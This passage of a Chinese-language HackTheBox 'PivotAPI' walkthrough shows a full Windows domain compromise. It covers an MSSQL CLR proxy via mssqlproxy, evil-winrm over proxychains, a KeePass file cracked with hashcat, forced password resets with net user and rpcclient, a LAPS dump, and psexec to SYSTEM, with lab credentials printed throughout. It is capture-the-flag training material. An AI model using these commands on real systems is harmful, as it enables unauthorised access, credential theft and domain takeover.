[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: Español
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(PIVOTAPI\SQLEXPRESS): Line 1: Se cambió el contexto de la base de datos a 'master'.
[*] INFO(PIVOTAPI\SQLEXPRESS): Line 1: Se cambió la configuración de idioma a Español.
[*] ACK: Result: 1 - Microsoft SQL Server 2019 RTM (15.0.2000)
[!] Press help for extra shell commands
SQL> enable_ole
SQL> upload reciclador.dll C:\windows\temp\reciclador.dll
[+] Uploading 'reciclador.dll' to 'C:\windows\temp\reciclador.dll'...
[+] Size is 109056 bytes
[+] Upload completed
```

```bash
┌──(kali㉿kali)-[~/Work/mssqlproxy]
└─$ python3 mssqlclient.py 'LicorDeBellota.htb/sa:#mssql_s3rV1c3!2020@10.129.228.115' -install -clr assembly.dll 
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

mssqlproxy - Copyright 2020 BlackArrow
[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: Español
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(PIVOTAPI\SQLEXPRESS): Line 1: Se cambió el contexto de la base de datos a 'master'.
[*] INFO(PIVOTAPI\SQLEXPRESS): Line 1: Se cambió la configuración de idioma a Español.
[*] ACK: Result: 1 - Microsoft SQL Server 2019 RTM (15.0.2000)
[*] Proxy mode: install
[*] CLR enabled
[*] Assembly successfully installed
[*] Procedure successfully installed
```

连接。

```bash
┌──(kali㉿kali)-[~/Work/mssqlproxy]
└─$  python3 mssqlclient.py 'LicorDeBellota.htb/sa:#mssql_s3rV1c3!2020@10.129.228.115' -start -reciclador 'C:\Windows\Temp\reciclador.dll'                                         
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

mssqlproxy - Copyright 2020 BlackArrow
[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: Español
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(PIVOTAPI\SQLEXPRESS): Line 1: Se cambió el contexto de la base de datos a 'master'.
[*] INFO(PIVOTAPI\SQLEXPRESS): Line 1: Se cambió la configuración de idioma a Español.
[*] ACK: Result: 1 - Microsoft SQL Server 2019 RTM (15.0.2000)
[*] Proxy mode: check
[*] Assembly is installed
[*] Procedure is installed
[*] reciclador is installed
[*] clr enabled
[*] Proxy mode: start
[*] Listening on port 1337...
[*] ACK from server!
```

```bash
┌──(kali㉿kali)-[~/Work/mssqlproxy]
└─$ sudo netstat -tnlp | grep 1337                         
[sudo] password for kali: 
tcp        0      0 0.0.0.0:1337            0.0.0.0:*               LISTEN      5916/python3
```

修改 `proxychains4`。

```bash
┌──(kali㉿kali)-[~/Work/Kali/PivotAPI]
└─$ tail -n 10 /etc/proxychains4.conf 
#
#       proxy types: http, socks4, socks5, raw
#         * raw: The traffic is simply forwarded to the proxy without modification.
#        ( auth types supported: "basic"-http  "user/pass"-socks )
#
[ProxyList]
# add proxy here ...
# meanwile
# defaults set to "tor"
socks5  127.0.0.1 1337
```

登入 `svc_mssql` 账户，下载桌面的文件。

```bash
┌──(kali㉿kali)-[~/Work/Kali/PivotAPI]
└─$ proxychains evil-winrm -i 127.0.0.1 -u svc_mssql -p '#mssql_s3rV1c3!2020'
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
                                        
Evil-WinRM shell v3.9
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
[proxychains] Strict chain  ...  127.0.0.1:1337  ...  127.0.0.1:5985  ...  OK
*Evil-WinRM* PS C:\Users\svc_mssql\Documents> cd ..
*Evil-WinRM* PS C:\Users\svc_mssql> ls


    Directorio: C:\Users\svc_mssql


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-r---        4/30/2021  10:38 AM                Desktop
d-r---         8/8/2020   7:45 PM                Documents
d-r---        9/15/2018   9:19 AM                Downloads
d-r---        9/15/2018   9:19 AM                Favorites
d-r---        9/15/2018   9:19 AM                Links
d-r---        9/15/2018   9:19 AM                Music
d-r---        9/15/2018   9:19 AM                Pictures
d-----        9/15/2018   9:19 AM                Saved Games
d-r---        9/15/2018   9:19 AM                Videos


*Evil-WinRM* PS C:\Users\svc_mssql> cd Desktop
*Evil-WinRM* PS C:\Users\svc_mssql\Desktop> ls


    Directorio: C:\Users\svc_mssql\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----         8/8/2020  10:12 PM           2286 credentials.kdbx
-a----        4/30/2021  10:39 AM             93 note.txt


*Evil-WinRM* PS C:\Users\svc_mssql\Desktop> download credentials.kdbx
                                        
Info: Downloading C:\Users\svc_mssql\Desktop\credentials.kdbx to credentials.kdbx
                                        
Info: Download successful!
*Evil-WinRM* PS C:\Users\svc_mssql\Desktop> download note.txt
                                        
Info: Downloading C:\Users\svc_mssql\Desktop\note.txt to note.txt
                                        
Info: Download successful
```

查看拿出的文件。

```bash
┌──(kali㉿kali)-[~/Work/Kali/PivotAPI]
└─$ ls -liah note.txt     
2789757 -rw-rw-r-- 1 kali kali 93 Apr 11 06:51 note.txt
                                                                                                                                                                                                                  
┌──(kali㉿kali)-[~/Work/Kali/PivotAPI]
└─$ ls -liah credentials.kdbx 
2789756 -rw-rw-r-- 1 kali kali 2.3K Apr 11 06:51 credentials.kdbx
                                                                                                                                                                                                                  
┌──(kali㉿kali)-[~/Work/Kali/PivotAPI]
└─$ cat note.txt    
Long running MSSQL Proxies can cause issues.  Please switch to SSH after getting credentials.
```

长时间运行 MSSQL 代理可能出现问题，请在获得凭据后选择 SSH。

破解 kdbx 得到密码 `mahalkita`。

```bash
┌──(kali㉿kali)-[~/Work/Kali/PivotAPI]
└─$ keepass2john credentials.kdbx > kdbx.hash
                                                                                                                                                                                                                  
┌──(kali㉿kali)-[~/Work/Kali/PivotAPI]
└─$ hashcat -m 13400 kdbx.hash /usr/share/wordlists/rockyou.txt --user 
hashcat (v7.1.2) starting

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
====================================================================================================================================================
* Device #01: cpu-haswell-13th Gen Intel(R) Core(TM) i9-13900HX, 13929/27859 MB (4096 MB allocatable), 8MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256
Minimum salt length supported by kernel: 0
Maximum salt length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Single-Hash
* Single-Salt

Watchdog: Temperature abort trigger set to 90c

Host memory allocated for this attack: 514 MB (27632 MB free)

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

$keepass$*2*60000*0*006e4f7f747a915a0301bded09da8339260ff96caf1ca7cef63b8fdd37c6a836*deabca672663938eddc0ee9e2726d9ff65d4ab7c6863f6f712f1c14b97c670a2*b33392502f94cd323ed25bc2d9c1749a*67ac769a9693b2ef7f1a149fb4e182042fcd2888df727ef4226edb5d9ae35c5c*dccf52b56e846bf088caa284beeaceffe16f304586ee13e87197387bac16ca6b:mahalkita
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 13400 (KeePass (KDBX v2/v3))
Hash.Target......: $keepass$*2*60000*0*006e4f7f747a915a0301bded09da833...16ca6b
Time.Started.....: Sat Apr 11 06:54:15 2026 (1 sec)
Time.Estimated...: Sat Apr 11 06:54:16 2026 (0 secs)
Kernel.Feature...: Pure Kernel (password length 0-256 bytes)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#01........:      750 H/s (13.49ms) @ Accel:117 Loops:1000 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 936/14344385 (0.01%)
Rejected.........: 0/936 (0.00%)
Restore.Point....: 0/14344385 (0.00%)
Restore.Sub.#01..: Salt:0 Amplifier:0-1 Iteration:59000-60000
Candidate.Engine.: Device Generator
Candidates.#01...: 123456 -> yourmom
Hardware.Mon.#01.: Util: 97%

Started: Sat Apr 11 06:53:57 2026
Stopped: Sat Apr 11 06:54:17 2026
```

登入 kdb。

查看发现的文件，发现一个 SSH 凭据：`3v4Si0N:Gu4nCh3C4NaRi0N!23`。

```bash
┌──(kali㉿kali)-[~/Work/Kali/PivotAPI]
└─$ kpcli -kdb credentials.kdbx 
Provide the master password: *************************

KeePass CLI (kpcli) v3.8.1 is ready for operation.
Type 'help' for a description of available commands.
Type 'help <command>' for details on individual commands.

kpcli:/> ls
=== Groups ===
Database/
kpcli:/> cd Database/
kpcli:/Database> ls
=== Groups ===
eMail/
General/
Homebanking/
Internet/
Network/
Recycle Bin/
Windows/
kpcli:/Database> ls eMail/
kpcli:/Database> ls General/
kpcli:/Database> ls Homebanking/
kpcli:/Database> ls Internet/
kpcli:/Database> ls Network/
kpcli:/Database> ls Recycle\ Bin/
=== Entries ===
0. Sample Entry                                               keepass.info
1. Sample Entry #2                          keepass.info/help/kb/testform.
kpcli:/Database> ls Windows/
=== Entries ===
2. SSH                                                                    
kpcli:/Database> show -f Recycle\ Bin/Sample\ Entry

 Path: /Database/Recycle Bin/
Title: Sample Entry
Uname: User Name
 Pass: Password
  URL: https://keepass.info/
Notes: Notes

kpcli:/Database> show -f Recycle\ Bin/Sample\ Entry\ #2 

 Path: /Database/Recycle Bin/
Use of uninitialized value $comment in split at /usr/bin/kpcli line 6338.
Use of uninitialized value $val in pattern match (m//) at /usr/bin/kpcli line 3275.
Use of uninitialized value $val in sprintf at /usr/bin/kpcli line 3279.
Title: Sample Entry #2
Uname: Michael321
 Pass: 12345
  URL: https://keepass.info/help/kb/testform.html
Notes: 

kpcli:/Database> show -f Windows/SSH 

 Path: /Database/Windows/
Title: SSH
Uname: 3v4Si0N
 Pass: Gu4nCh3C4NaRi0N!23
  URL: 
Notes:
```

登入 `3v4si0n`。

```bash
Microsoft Windows [Versión 10.0.17763.1879]
(c) 2018 Microsoft Corporation. Todos los derechos reservados.

licordebellota\3v4si0n@PIVOTAPI C:\Users\3v4Si0N>whoami
licordebellota\3v4si0n

licordebellota\3v4si0n@PIVOTAPI C:\Users\3v4Si0N>whoami /priv

INFORMACIÓN DE PRIVILEGIOS
--------------------------

Nombre de privilegio          Descripción                                  Estado
============================= ============================================ ==========
SeMachineAccountPrivilege     Agregar estaciones de trabajo al dominio     Habilitada
SeChangeNotifyPrivilege       Omitir comprobación de recorrido             Habilitada
SeIncreaseWorkingSetPrivilege Aumentar el espacio de trabajo de un proceso Habilitada

```

枚举发现一个用户 `Devolopers`。

```bash
licordebellota\3v4si0n@PIVOTAPI c:\>net group /domain

Cuentas de grupo de \\PIVOTAPI

-------------------------------------------------------------------------------
*Administradores clave
*Administradores clave de la organización
*Administradores de empresas
*Administradores de esquema
*Admins. del dominio
*Controladores de dominio
*Controladores de dominio clonables
*Controladores de dominio de sólo lectura
*Developers
*DnsUpdateProxy
*Enterprise Domain Controllers de sólo lectura
*Equipos del dominio
*Invitados del dominio
*LAPS ADM
*LAPS READ
*Propietarios del creador de directivas de grupo
*Protected Users
*Usuarios del dominio
*WinRM
Se ha completado el comando correctamente.
```

```bash
licordebellota\3v4si0n@PIVOTAPI c:\>net group Developers /domain
Nombre de grupo     Developers
Comentario

Miembros

-------------------------------------------------------------------------------
jari                     superfume
Se ha completado el comando correctamente.

```

使用 bloodhoun 横向移动到 `Devolopers`。

![](Pasted%20image%2020260411202626.png)

```bash
licordebellota\3v4si0n@PIVOTAPI c:\>net user DR.ZAIUSS enil12408@Pass!
Se ha completado el comando correctamente.
```

```bash
┌──(kali㉿kali)-[~/Work/Kali/PivotAPI]
└─$ proxychains evil-winrm -i 127.0.0.1 -u dr.zaiuss -p 'enil12408@Pass!'
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
                                        
Evil-WinRM shell v3.9
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
[proxychains] Strict chain  ...  127.0.0.1:1337  ...  127.0.0.1:5985  ...  OK
*Evil-WinRM* PS C:\Users\Dr.Zaiuss\Documents> net user superfume enil12408@Pass!
Se ha completado el comando correctamente.

```

```bash
┌──(kali㉿kali)-[~/Work/Kali/PivotAPI]
└─$ proxychains evil-winrm -i 127.0.0.1 -u superfume -p 'enil12408@Pass!'
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
                                        
Evil-WinRM shell v3.9
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
[proxychains] Strict chain  ...  127.0.0.1:1337  ...  127.0.0.1:5985  ...  OK
*Evil-WinRM* PS C:\Users\superfume\Documents> cd c:\
*Evil-WinRM* PS C:\> ls


    Directorio: C:\


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----         8/8/2020   7:23 PM                Developers
d-----         8/8/2020  12:53 PM                inetpub
d-----         8/8/2020  10:48 PM                PerfLogs
d-r---        2/19/2021   1:42 PM                Program Files
d-----         8/9/2020   5:06 PM                Program Files (x86)
d-r---         8/8/2020   7:46 PM                Users
d-----        4/29/2021   5:31 PM                Windows


*Evil-WinRM* PS C:\> cd Devolopers
Cannot find path 'C:\Devolopers' because it does not exist.
At line:1 char:1
+ cd Devolopers
+ ~~~~~~~~~~~~~
    + CategoryInfo          : ObjectNotFound: (C:\Devolopers:String) [Set-Location], ItemNotFoundException
    + FullyQualifiedErrorId : PathNotFound,Microsoft.PowerShell.Commands.SetLocationCommand
*Evil-WinRM* PS C:\> cd Developers
*Evil-WinRM* PS C:\Developers> ls


    Directorio: C:\Developers


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----         8/8/2020   7:26 PM                Jari
d-----         8/8/2020   7:23 PM                Superfume


*Evil-WinRM* PS C:\Developers> cd Jari
*Evil-WinRM* PS C:\Developers\Jari> ls


    Directorio: C:\Developers\Jari


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----         8/8/2020   7:26 PM           3676 program.cs
-a----         8/8/2020   7:18 PM           7168 restart-mssql.exe


*Evil-WinRM* PS C:\Developers\Jari> download program.cs
                                        
Info: Downloading C:\Developers\Jari\program.cs to program.cs
                                        
Info: Download successful!
*Evil-WinRM* PS C:\Developers\Jari> download restart-mssql.exe
                                        
Info: Downloading C:\Developers\Jari\restart-mssql.exe to restart-mssql.exe
                                        
Info: Download successful!
*Evil-WinRM* PS C:\Developers\Jari> cd ..\Superfume
*Evil-WinRM* PS C:\Developers\Superfume> ls
```

```bash
┌──(kali㉿kali)-[~/Work/Kali/PivotAPI]
└─$ ls -liah program.cs                     
2785361 -rw-rw-r-- 1 kali kali 3.6K Apr 11 08:41 program.cs
                                                                                                                                                                                                                                                             
┌──(kali㉿kali)-[~/Work/Kali/PivotAPI]
└─$ ls -liah restart-mssql.exe 
2789556 -rw-rw-r-- 1 kali kali 7.0K Apr 11 08:41 restart-mssql.exe
```

```bash
┌──(kali㉿kali)-[~/Work/Kali/PivotAPI]
└─$ cat program.cs                         
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Diagnostics;
using System.Threading;

namespace restart_oracle
{
    class Program
    {
        public class RC4
        {

            public static byte[] Encrypt(byte[] pwd, byte[] data)
            {
                int a, i, j, k, tmp;
                int[] key, box;
                byte[] cipher;

                key = new int[256];
                box = new int[256];
                cipher = new byte[data.Length];

                for (i = 0; i < 256; i++)
                {
                    key[i] = pwd[i % pwd.Length];
                    box[i] = i;
                }
                for (j = i = 0; i < 256; i++)
                {
                    j = (j + box[i] + key[i]) % 256;
                    tmp = box[i];
                    box[i] = box[j];
                    box[j] = tmp;
                }
                for (a = j = i = 0; i < data.Length; i++)
                {
                    a++;
                    a %= 256;
                    j += box[a];
                    j %= 256;
                    tmp = box[a];
                    box[a] = box[j];
                    box[j] = tmp;
                    k = box[((box[a] + box[j]) % 256)];
                    cipher[i] = (byte)(data[i] ^ k);
                }
                return cipher;
            }

            public static byte[] Decrypt(byte[] pwd, byte[] data)
            {
                return Encrypt(pwd, data);
            }

            public static byte[] StringToByteArray(String hex)
            {
                int NumberChars = hex.Length;
                byte[] bytes = new byte[NumberChars / 2];
                for (int i = 0; i < NumberChars; i += 2)
                    bytes[i / 2] = Convert.ToByte(hex.Substring(i, 2), 16);
                return bytes;
            }

        }

        static void Main()
        {
        
            string banner = @"
    ____            __             __                               __
   / __ \___  _____/ /_____ ______/ /_   ____ ___  ______________ _/ /
  / /_/ / _ \/ ___/ __/ __ `/ ___/ __/  / __ `__ \/ ___/ ___/ __ `/ / 
 / _, _/  __(__  ) /_/ /_/ / /  / /_   / / / / / (__  |__  ) /_/ / /  
/_/ |_|\___/____/\__/\__,_/_/   \__/  /_/ /_/ /_/____/____/\__, /_/   
                                                             /_/      
                                                 by @HelpDesk 2020

";
            byte[] key = Encoding.ASCII.GetBytes("");
            byte[] password_cipher = { };
            byte[] resultado = RC4.Decrypt(key, password_cipher);
            Console.WriteLine(banner);
            Thread.Sleep(5000);
            System.Diagnostics.Process psi = new System.Diagnostics.Process();
            System.Security.SecureString ssPwd = new System.Security.SecureString();
            psi.StartInfo.FileName = "c:\\windows\\syswow64\\cmd.exe";
            psi.StartInfo.Arguments = "/c sc.exe stop SERVICENAME ; sc.exe start SERVICENAME";
            psi.StartInfo.RedirectStandardOutput = true;
            psi.StartInfo.UseShellExecute = false;
            psi.StartInfo.UserName = "Jari";
            string password = "";
            for (int x = 0; x < password.Length; x++)
            {
               ssPwd.AppendChar(password[x]);
            }
            password = "";
            psi.StartInfo.Password = ssPwd;
            psi.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
            psi.Start();

        }
    }
}

```

逆向分析这个文件。

![](Pasted%20image%2020260411211347.png)

![](Pasted%20image%2020260411211402.png)

获得凭据尝试利用。

```bash
┌──(kali㉿kali)-[~/Work/Kali/PivotAPI]
└─$ rpcclient -U 'jari%Cos@Chung@!RPG' 10.129.228.115
rpcclient $> setuserinfo2 gibdeon 23 'enil12408@Pass!'
rpcclient $> 

```

```bash
┌──(kali㉿kali)-[~/Work/Kali/PivotAPI]
└─$ rpcclient -U 'gibdeon%enil12408@Pass!' 10.129.228.115
rpcclient $> setuserinfo2 lothbrok 23 'enil12408@Pass!'
rpcclient $> 

```

```bash
┌──(kali㉿kali)-[~/Work/Kali/PivotAPI]
└─$ python laps.py -u lothbrok -p enil12408@Pass! -l 10.129.228.115 -d LicorDeBellota.htb
LAPS Dumper - Running at 04-11-2026 09:29:53
PIVOTAPI r78tt44ZJ98vb94982K7
```

```bash
┌──(kali㉿kali)-[~/Work/Kali/PivotAPI]
└─$ /usr/share/doc/python3-impacket/examples/psexec.py Administrador:'r78tt44ZJ98vb94982K7'@10.129.228.115
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Requesting shares on 10.129.228.115.....
[*] Found writable share ADMIN$
[*] Uploading file RfVXKQZh.exe
[*] Opening SVCManager on 10.129.228.115.....
[*] Creating service vZvy on 10.129.228.115.....
[*] Starting service vZvy.....
[!] Press help for extra shell commands
[-] Decoding error detected, consider running chcp.com at the target,
map the result with https://docs.python.org/3/library/codecs.html#standard-encodings
and then execute smbexec.py again with -codec and the corresponding codec
Microsoft Windows [Versi�n 10.0.17763.1879]

(c) 2018 Microsoft Corporation. Todos los derechos reservados.

C:\Windows\system32> whoami
nt authority\system

c:\Users\administrador\Desktop> type c:\Users\cybervaca\Desktop\root.txt
f453c41***********ad6ce70a2
```